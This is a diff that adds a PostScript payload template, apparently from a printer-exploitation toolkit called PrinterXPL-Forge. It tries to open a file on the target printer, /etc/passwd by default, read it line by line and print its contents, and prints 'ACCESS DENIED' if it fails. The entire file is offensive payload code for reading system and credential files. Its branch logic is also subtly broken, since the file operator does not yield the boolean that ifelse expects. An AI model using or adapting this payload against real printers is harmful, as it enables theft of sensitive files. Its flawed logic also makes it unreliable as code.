@@ -1,0 +1,31 @@
+%!PS
+% PrinterXPL-Forge Data Exfiltration Payload
+% Attempts to read and print sensitive file
+% File: {{file}} (default: /etc/passwd)
+
+% Try to read file
+({{file}}) (r) file {
+    % File opened successfully
+    /filestream exch def
+    /Courier findfont 10 scalefont setfont
+    
+    % Read and print each line
+    {
+        filestream 256 string readline {
+            10 10 moveto
+            show
+            showpage
+        } {
+            exit
+        } ifelse
+    } loop
+    
+    filestream closefile
+} {
+    % File access denied
+    /Helvetica findfont 16 scalefont setfont
+    100 700 moveto
+    (File {{file}} - ACCESS DENIED) show
+    showpage
+} ifelse
+
